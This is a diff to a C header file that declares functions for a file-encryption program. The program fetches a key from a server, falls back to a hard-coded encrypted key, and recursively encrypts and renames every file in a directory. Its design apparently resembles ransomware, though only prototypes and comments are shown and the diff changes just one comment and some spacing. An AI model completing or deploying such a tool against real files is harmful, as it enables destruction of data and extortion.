@@ -17,7 +17,7 @@ enum {
 // check in main if the key is given to either encrypt or decrypt
 extern int ENCRYPT;
 
-// get the key from the webpage
+// get the key from the server
 // or if not able to do it use the hard coded encrypted key
 char* getKey();
 
@@ -25,6 +25,7 @@ char* getKey();
 FILE* openFile(const char* path, const char* mode);
 // close the input and output files
 int closeFile(FILE*, FILE*);
+
 // docrypt will read each char from input
 // and use the function given in argument to encrypt each char
 // will write de encrypted char in the output file
@@ -33,6 +34,7 @@ int docrypt(FILE* input, FILE* output, const char* key,int (*)(int, char[], cons
 int encrypt(int n, char[n], const char*, int*);
 // decrypt the char with the given key
 int decrypt(int n, char[n], const char*, int*);
+
 // add the extension to the encrypted file
 char* addext(const char* path, const char* ext);
 // remove the extension from the file
@@ -41,12 +43,11 @@ char* remext(const char* input);
 // take the path of a file and manage function to encrypt it
 int processFile(char* path, const char* key);
 
-/////////////////////
-
 // check if the given path is a directory
 int isDir(char* path);
 // show the files in the directory recursively and encrypt them
 int encDir(char* path, const char* key);
+
 // add the full path to the file
 char* addPath(const char* path, const char* file);
 
